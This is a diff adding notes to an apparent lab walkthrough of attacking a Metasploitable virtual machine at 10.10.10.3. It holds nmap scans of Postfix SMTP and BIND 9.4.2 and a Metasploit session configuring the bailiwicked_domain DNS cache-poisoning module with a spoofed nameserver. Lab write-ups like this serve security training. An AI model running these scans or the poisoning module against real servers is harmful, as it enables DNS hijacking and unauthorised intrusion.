@@ -113,3 +113,58 @@ got the username and password user:user
 
 and finally got Shell
 
+### Scan 23 and did not get anything
+
+### Port 25 Postfix smtpd Exploiting
+
+```bash
+nmap  -sV -sC -p25 10.10.10.3
+
+PORT   STATE SERVICE VERSION
+25/tcp open  smtp    Postfix smtpd
+|_ssl-date: 2026-11-26T05:39:50+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2010-03-17T14:07:45
+|_Not valid after:  2010-04-16T14:07:45
+|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+MAC Address: 08:00:27:C7:96:A4 (Oracle VirtualBox virtual NIC)
+Service Info: Host:  metasploitable.localdomain
+```
+
+### Port 53 Exploit
+
+```bash
+nmap -sC -sV -p53 10.10.10.3
+
+PORT   STATE SERVICE VERSION
+53/tcp open  domain  ISC BIND 9.4.2
+| dns-nsid: 
+|_  bind.version: 9.4.2
+MAC Address: 08:00:27:C7:96:A4 (Oracle VirtualBox virtual NIC)
+```
+
+[Exploit_DB](https://www.exploit-db.com/exploits/6122)
+
+```bash
+msfconsole -q
+
+msf > use auxiliary/spoof/dns/bailiwicked_domain
+msf auxiliary(bailiwicked_domain) > set RHOST 10.10.10.3
+msf auxiliary(bailiwicked_domain) > set DOMAIN example.com
+msf auxiliary(bailiwicked_domain) > set NEWDNS dns01.metasploit.com
+msf auxiliary(bailiwicked_domain) > set SRCPORT 0
+msf auxiliary(bailiwicked_domain) > check
+msf auxiliary(bailiwicked_domain) > dig +short -t ns example.com @10.10.10.3
+msf auxiliary(bailiwicked_domain) > run
+
+```
+
